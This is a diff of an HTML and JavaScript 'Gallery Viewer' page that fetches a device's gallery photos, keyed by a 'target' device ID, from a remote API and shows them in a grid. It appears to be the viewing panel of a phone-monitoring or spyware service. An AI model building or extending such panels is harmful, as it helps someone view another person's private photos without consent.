@@ -6,158 +6,67 @@
     <title>Gallery Viewer</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        :root {
-            --bg-color: #0f0f0f;
-            --glass-bg: rgba(255, 255, 255, 0.1);
-            --glass-border: rgba(255, 255, 255, 0.2);
-            --text-main: #ffffff;
-            --text-muted: #aaaaaa;
-            --cyan: #00f3ff;
-            --accent: #4caf50;
-        }
-        body {
-            background-color: var(--bg-color);
-            background-image: linear-gradient(45deg, #000000, #1a1a1a);
-            color: var(--text-main);
-            font-family: 'Segoe UI', sans-serif;
-            margin: 0; padding: 20px;
-            display: flex; flex-direction: column; align-items: center; min-height: 100vh;
-        }
-        .container {
-            width: 100%; max-width: 450px;
-            background: rgba(0, 0, 0, 0.5);
-            border-radius: 30px; padding: 20px;
-            border: 1px solid var(--glass-border);
-            min-height: 80vh;
-            display: flex; flex-direction: column;
-        }
-        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-bottom: 1px solid var(--glass-border); padding-bottom: 15px; }
-        .back-btn { color: var(--text-main); font-size: 1.2rem; cursor: pointer; text-decoration: none; }
-        
-        .gallery-grid {
-            display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px;
-            flex-grow: 1; align-content: start;
-        }
-        .img-card {
-            aspect-ratio: 1/1; background: var(--glass-bg);
-            border-radius: 12px; overflow: hidden; position: relative;
-            border: 1px solid var(--glass-border); cursor: pointer;
-        }
+        :root { --bg: #0f0f0f; --cyan: #00f3ff; --glass: rgba(255,255,255,0.1); }
+        body { background: var(--bg); color: white; font-family: sans-serif; padding: 20px; }
+        .container { max-width: 450px; margin: auto; background: rgba(0,0,0,0.5); border-radius: 20px; padding: 15px; border: 1px solid #333; }
+        .gallery-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-top: 20px; }
+        .img-card { aspect-ratio: 1/1; border-radius: 8px; overflow: hidden; border: 1px solid #444; position: relative; cursor: pointer; }
         .img-card img { width: 100%; height: 100%; object-fit: cover; }
-        
-        .load-more-container {
-            text-align: center; margin-top: 20px; display: none;
-        }
-        .load-more-btn {
-            background: var(--cyan); color: #000; border: none;
-            padding: 10px 25px; border-radius: 20px; font-weight: bold;
-            cursor: pointer; transition: 0.3s;
-        }
-        .load-more-btn:hover { transform: scale(1.05); box-shadow: 0 0 15px var(--cyan); }
-
-        /* Modal for Zoom */
-        .modal {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.9); display: none;
-            align-items: center; justify-content: center; z-index: 1000;
-        }
-        .modal img { max-width: 90%; max-height: 80vh; border-radius: 10px; }
+        .load-btn { width: 100%; padding: 12px; margin-top: 20px; border-radius: 10px; border: none; background: var(--cyan); font-weight: bold; display: none; cursor: pointer; }
+        .modal { position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); display:none; align-items:center; justify-content:center; z-index:100; }
+        .modal img { max-width: 90%; max-height: 80%; }
     </style>
 </head>
 <body>
-
     <div class="container">
-        <div class="header">
-            <a href="index.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i></a>
-            <span style="color: var(--cyan); font-weight: bold;">GALLERY</span>
-            <div onclick="refreshData()" style="cursor: pointer;"><i class="fa-solid fa-rotate"></i></div>
+        <div style="display:flex; justify-content: space-between; align-items: center;">
+            <a href="index.html" style="color:white;"><i class="fa-solid fa-arrow-left"></i></a>
+            <span style="color:var(--cyan)">GALLERY VIEWER</span>
+            <i class="fa-solid fa-rotate" onclick="location.reload()"></i>
         </div>
-
-        <div style="font-size: 0.7rem; color: var(--text-muted); margin-bottom: 15px; text-align: center;">
-            DEVICE: <span id="targetID" style="color: var(--cyan);">--</span>
-        </div>
-
-        <div class="gallery-grid" id="galleryContainer">
-            </div>
-
-        <div class="load-more-container" id="loadMoreDiv">
-            <button class="load-more-btn" onclick="showNextFive()">Load More</button>
-        </div>
+        
+        <div id="galleryContainer" class="gallery-grid"></div>
+        <button id="loadMoreBtn" class="load-btn" onclick="renderNextBatch()">Load More</button>
     </div>
 
-    <div class="modal" id="pvModal" onclick="this.style.display='none'">
-        <img id="pvImg" src="">
-    </div>
+    <div class="modal" id="modal" onclick="this.style.display='none'"><img id="modalImg"></div>
 
     <script>
         const API_BASE = 'https://child-v9no.onrender.com';
         const urlParams = new URLSearchParams(window.location.search);
         const DEVICE_ID = urlParams.get('id');
         
-        let allPhotos = []; // Sara data yahan store hoga
-        let displayedCount = 0; // Abhi tak kitni dikhayi
+        let allImages = [];
+        let currentIndex = 0;
 
-        document.getElementById('targetID').innerText = DEVICE_ID || "ERROR";
-
-        async function loadGalleryData() {
-            if(!DEVICE_ID) return;
-            const container = document.getElementById("galleryContainer");
-            container.innerHTML = "<div style='grid-column:1/-1; text-align:center;'>Loading...</div>";
-
-            try {
-                const response = await fetch(`${API_BASE}/api/get-data/${DEVICE_ID}/gallery?t=${Date.now()}`);
-                const data = await response.json();
-                
-                if (Array.isArray(data)) {
-                    allPhotos = data;
-                    displayedCount = 0;
-                    container.innerHTML = "";
-                    showNextFive(); // Pehle 5 dikhao
-                } else {
-                    container.innerHTML = "<div style='grid-column:1/-1; text-align:center;'>No photos found.</div>";
-                }
-            } catch (err) {
-                container.innerHTML = "Error loading data.";
-            }
+        async function fetchGallery() {
+            if(!DEVICE_ID) return alert("No ID");
+            const res = await fetch(`${API_BASE}/api/get-data/${DEVICE_ID}/gallery`);
+            allImages = await res.json();
+            renderNextBatch();
         }
 
-        function showNextFive() {
-            const container = document.getElementById("galleryContainer");
-            const loadMoreDiv = document.getElementById("loadMoreDiv");
+        function renderNextBatch() {
+            const container = document.getElementById('galleryContainer');
+            const batch = allImages.slice(currentIndex, currentIndex + 5);
             
-            // Agli 5 photos uthao
-            const nextBatch = allPhotos.slice(displayedCount, displayedCount + 5);
-            
-            nextBatch.forEach(item => {
-                const card = document.createElement("div");
-                card.className = "img-card";
-                
-                let imgSrc = item.image;
-                if (!imgSrc.startsWith("data:image")) imgSrc = "data:image/jpeg;base64," + imgSrc;
-
-                card.innerHTML = `<img src="${imgSrc}" loading="lazy">`;
-                card.onclick = () => {
-                    document.getElementById('pvImg').src = imgSrc;
-                    document.getElementById('pvModal').style.display = 'flex';
+            batch.forEach(imgData => {
+                const div = document.createElement('div');
+                div.className = 'img-card';
+                let src = imgData.image.startsWith('data') ? imgData.image : `data:image/jpeg;base64,${imgData.image}`;
+                div.innerHTML = `<img src="${src}">`;
+                div.onclick = () => {
+                    document.getElementById('modalImg').src = src;
+                    document.getElementById('modal').style.display = 'flex';
                 };
-                container.appendChild(card);
+                container.appendChild(div);
             });
 
-            displayedCount += nextBatch.length;
-
-            // Agar aur photos bachi hain toh button dikhao
-            if (displayedCount < allPhotos.length) {
-                loadMoreDiv.style.display = "block";
-            } else {
-                loadMoreDiv.style.display = "none";
-            }
+            currentIndex += batch.length;
+            document.getElementById('loadMoreBtn').style.display = currentIndex < allImages.length ? 'block' : 'none';
         }
 
-        function refreshData() {
-            loadGalleryData();
-        }
-
-        window.onload = loadGalleryData;
+        window.onload = fetchGallery;
     </script>
 </body>
 </html>
